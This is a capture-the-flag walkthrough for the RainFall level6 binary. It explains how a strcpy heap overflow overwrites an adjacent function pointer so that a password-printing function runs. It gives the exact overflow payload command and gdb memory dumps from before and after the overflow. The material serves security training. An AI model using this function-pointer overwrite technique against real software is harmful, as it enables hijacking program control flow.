##	Description

This level introduces a new difficulty in reverse-engineering: function pointers.

The main allocates two pointers, `buf` and `ptr`. The first one is allocated as a 64 bytes char* buffer, while the second one is allocated with only 4 bytes, which is the usual size for a pointer on 32-bit systems.

If we look at all the call instructions from the disassembly, we can see that right before the return, instead of calling the desired function directly, the program calls it from the previously allocated `ptr`:

```assembly
   0x080484d0 <+84>:	call   *%eax
```

This means that the program is calling a function from the address stored in the register `%eax`. Judging from the behaviour of the program, the function called is `m()`, which is the one that prints "Nope". This means that the address of `m()` is stored in `%eax` at this point. But we want to call `n()`, which calls `system("/bin/cat /home/user/level7/.pass")` and prints the password for the next level.

We can do this by overflowing the buffer allocated for `buf`; this is done with the `strcpy(buf, av[1])` instruction. Since `buf` is allocated with 64 bytes, we need to write more than 64 bytes to overflow it. The first 64 bytes will fill the buffer plus some 8 bytes to overwrite return addresses and other irrelevant words, then overwrite the value of `ptr` with the address of `n()`, since it is located right after `buf`.

The payload we need is this one:

```bash
	level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

This is the heap layout after the allocation, but before the overflow with strcpy:

```bash
(gdb) x/32wx 0x804a000
0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048468      0x00000000      0x00000000      0x00020fa9
                  ^ ptr -> 0x08048468 (address of m())
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```

And this is the layout after the overflow:

```bash
(gdb) x/32wx 0x804a000
0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a050:      0x08048454      0x00000000      0x00000000      0x00020fa9
                  ^ ptr -> 0x08048454 (address of n())
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```
